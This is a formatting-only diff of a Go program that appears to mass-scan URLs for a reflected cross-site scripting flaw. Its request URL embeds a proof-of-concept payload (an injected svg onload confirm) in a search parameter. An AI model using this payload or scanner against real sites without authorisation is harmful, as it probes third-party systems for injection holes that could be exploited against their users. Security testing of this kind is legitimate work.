@@ -52,7 +52,7 @@ func main() {
 	// make an actual time.Duration out of the timeout
 	timeout := time.Duration(to * 1000000)
 
-	// custom transport to be used with the client 
+	// custom transport to be used with the client
 	var tr = &http.Transport{
 		MaxIdleConns:      30,
 		IdleConnTimeout:   time.Second,
@@ -91,7 +91,7 @@ func main() {
 					if verbose {
 						fmt.Printf("[*]	Potential hit found at %s\n", url)
 					} else {
-						fmt.Printf("%s\n",url)	
+						fmt.Printf("%s\n", url)
 					}
 					continue
 				}
@@ -128,9 +128,9 @@ func main() {
 	// wait until all the workers have finished
 	wg.Wait()
 
-} 
+}
 
-func isVulnerable (client *http.Client, url string) bool {
+func isVulnerable(client *http.Client, url string) bool {
 
 	if verbose {
 		fmt.Printf("Attempting %s\n", url)
@@ -141,7 +141,7 @@ func isVulnerable (client *http.Client, url string) bool {
 
 	// perform the GET request
 	_url := url + "/7/100/33/1d/www.citysearch.com/search?what=reallylongstringtomakethepayloadforxssmoveoutofview&where=place%22%3E%3Csvg+onload=confirm(document.location)%3E"
-	
+
 	req, err := http.NewRequest("GET", _url, nil)
 	if err != nil {
 		return false
@@ -152,19 +152,19 @@ func isVulnerable (client *http.Client, url string) bool {
 	req.Close = true
 
 	resp, err := client.Do(req)
-	
+
 	// assuming a response, read the body
-	if resp != nil  && resp.StatusCode == 200 {
-		
+	if resp != nil && resp.StatusCode == 200 {
+
 		bodyBytes, err := ioutil.ReadAll(resp.Body)
 		if err != nil {
-				return false
+			return false
 		}
 
 		bodyString := string(bodyBytes)
 
 		// check for reflected XSS
-		if ( strings.Contains(bodyString, "reallylongstringtomakethepayloadforxssmoveoutofview") ) {
+		if strings.Contains(bodyString, "reallylongstringtomakethepayloadforxssmoveoutofview") {
 			return true
 		}
 
